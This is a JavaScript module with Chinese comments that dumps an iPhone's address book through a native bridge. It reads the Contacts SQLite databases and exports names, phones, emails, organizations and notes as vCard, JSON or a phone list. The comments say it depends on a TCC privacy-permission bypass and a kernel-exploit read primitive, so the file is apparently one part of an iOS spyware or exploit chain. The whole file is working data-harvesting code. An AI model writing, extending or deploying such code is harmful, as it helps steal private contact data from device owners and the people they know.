/* =============================================================================
 * addressbook_dump.js — 通讯录 dump 模块 (ABAddressBook / Contacts.framework)
 * =============================================================================
 *
 * 设计思路:
 *   1. iOS Contacts 数据存储:
 *      - /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb
 *      - /private/var/mobile/Library/AddressBook/AddressBookImages.sqlitedb
 *      - /private/var/mobile/Library/AddressBook/AddressBook-v22.abcddb (iOS 17+)
 *   2. Schema (核心表):
 *      - ABPerson   (姓名, 公司, 备注)
 *      - ABMultiValue (电话, 邮箱, URL) - label/identifier/value 字段
 *      - ABGroup
 *   3. 输出格式: vCard 3.0 (标准 RFC 2426)
 *
 * 依赖: TCC bypass (kTCCServiceAddressBook) + window.nativeBridge
 *
 * 调用方式:
 *   const ab = await loadAddressBookDump();
 *   const vcf = await ab.to_vcard();
 * ============================================================================= */

(function () {
  'use strict';

  const ADDRESSBOOK_PATHS = {
    legacy: '/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb',
    images: '/private/var/mobile/Library/AddressBook/AddressBookImages.sqlitedb',
    modern: '/private/var/mobile/Library/AddressBook/AddressBook-v22.abcddb'
  };

  // ABProperty 标识 (from <AddressBook/ABPerson.h>)
  const AB_PROPERTY = {
    kABPersonFirstNameProperty: 'first_name',
    kABPersonLastNameProperty:  'last_name',
    kABPersonMiddleNameProperty:'middle_name',
    kABPersonOrganizationProperty:'organization',
    kABPersonJobTitleProperty:  'job_title',
    kABPersonNoteProperty:      'note',
    kABPersonPhoneProperty:     'phone',
    kABPersonEmailProperty:     'email',
    kABPersonURLProperty:       'url',
    kABPersonAddressProperty:   'address'
  };

  function loadAddressBookDump() {
    if (!window.tcc_bypassed && !window._tcc_bypassed) {
      console.warn('[addressbook] TCC not bypassed yet, will attempt anyway');
    }
    if (!window.nativeBridge || !window.nativeBridge.isReady || !window.nativeBridge.isReady()) {
      return Promise.resolve({
        ok: false,
        error: 'no-native-bridge',
        message: '通讯录 dump 需要 kexploit kR 原语. 配合 TCC bypass 后可绕过 kTCCServiceAddressBook 检查.'
      });
    }

    return Promise.resolve({
      ok: true,
      paths: ADDRESSBOOK_PATHS,

      // -------------------------------------------------------------------------
      // 转 vCard 3.0 格式
      // -------------------------------------------------------------------------
      to_vcard: async function (opts) {
        opts = opts || {};
        const maxContacts = opts.max || 5000;

        const result = {
          ok: true,
          format: 'vcard-3.0',
          count: 0,
          vcf: 'BEGIN:VCARD\r\nVERSION:3.0\r\nPRODID:-//Coruna//AddressBookDump//EN\r\n',
          raw_count: 0,
          source: ADDRESSBOOK_PATHS.modern,
          timestamp: Date.now()
        };

        try {
          if (typeof window.nativeBridge.dumpContacts === 'function') {
            const raw = await window.nativeBridge.dumpContacts();
            const items = (typeof raw === 'string') ? safeParseContacts(raw) : (raw.items || []);

            result.raw_count = items.length;

            for (let i = 0; i < items.length && result.count < maxContacts; i++) {
              const c = items[i];
              let card = 'BEGIN:VCARD\r\nVERSION:3.0\r\n';
              if (c.first_name || c.last_name) {
                const name = [c.last_name || '', c.first_name || ''].join(';');
                card += 'N:' + name + '\r\n';
                card += 'FN:' + ((c.first_name || '') + ' ' + (c.last_name || '')).trim() + '\r\n';
              }
              if (c.organization) card += 'ORG:' + c.organization + '\r\n';
              if (c.job_title)    card += 'TITLE:' + c.job_title + '\r\n';
              if (c.note)         card += 'NOTE:' + escapeVcard(c.note) + '\r\n';

              if (Array.isArray(c.phones)) {
                c.phones.forEach(function (p, idx) {
                  card += 'TEL;TYPE=' + (p.label || 'CELL').toUpperCase() + ':' + p.value + '\r\n';
                });
              }
              if (Array.isArray(c.emails)) {
                c.emails.forEach(function (e, idx) {
                  card += 'EMAIL;TYPE=' + (e.label || 'INTERNET').toUpperCase() + ':' + e.value + '\r\n';
                });
              }
              card += 'REV:' + new Date().toISOString() + '\r\n';
              card += 'END:VCARD\r\n';

              result.vcf += card;
              result.count++;
            }
          } else {
            result.ok = false;
            result.error = 'nativeBridge.dumpContacts not implemented';
          }
        } catch (e) {
          result.ok = false;
          result.error = String(e.message || e);
        }

        result.vcf += 'END:VCARD\r\n';
        return result;
      },

      // -------------------------------------------------------------------------
      // 转 JSON (便于分析)
      // -------------------------------------------------------------------------
      to_json: async function (opts) {
        const vcf_res = await this.to_vcard(opts);
        return {
          ok: vcf_res.ok,
          error: vcf_res.error || null,
          source: vcf_res.source,
          count: vcf_res.count,
          contacts: parseVcardToJson(vcf_res.vcf)
        };
      },

      // -------------------------------------------------------------------------
      // 只取电话号码 (用于快速提取)
      // -------------------------------------------------------------------------
      phones_only: async function () {
        const j = await this.to_json({ max: 2000 });
        const phones = [];
        (j.contacts || []).forEach(function (c) {
          (c.phones || []).forEach(function (p) {
            phones.push({ name: c.fn, number: p.value, label: p.label });
          });
        });
        return { ok: j.ok, count: phones.length, phones: phones };
      }
    });
  }

  function safeParseContacts(s) {
    try { return JSON.parse(s); } catch (_) { return []; }
  }

  function escapeVcard(s) {
    return String(s).replace(/\n/g, '\\n').replace(/,/g, '\\,').replace(/;/g, '\\;');
  }

  function parseVcardToJson(vcf) {
    const cards = vcf.split('BEGIN:VCARD').slice(1);
    return cards.map(function (chunk) {
      const c = { first_name: null, last_name: null, fn: null, organization: null,
                  phones: [], emails: [], note: null };
      chunk.split(/\r?\n/).forEach(function (line) {
        if (!line || line === 'END:VCARD') return;
        if (line.startsWith('N:')) {
          const parts = line.substring(2).split(';');
          c.last_name = parts[0] || null;
          c.first_name = parts[1] || null;
        } else if (line.startsWith('FN:')) {
          c.fn = line.substring(3);
        } else if (line.startsWith('TEL')) {
          const m = /TEL.*?:(.+)/.exec(line);
          if (m) c.phones.push({ value: m[1].trim(), label: 'cell' });
        } else if (line.startsWith('EMAIL')) {
          const m = /EMAIL.*?:(.+)/.exec(line);
          if (m) c.emails.push({ value: m[1].trim(), label: 'internet' });
        } else if (line.startsWith('ORG:')) {
          c.organization = line.substring(4);
        } else if (line.startsWith('NOTE:')) {
          c.note = line.substring(5);
        }
      });
      return c;
    }).filter(function (c) { return c.fn || c.phones.length; });
  }

  if (typeof window !== 'undefined') {
    window.loadAddressBookDump = loadAddressBookDump;
  }

})();
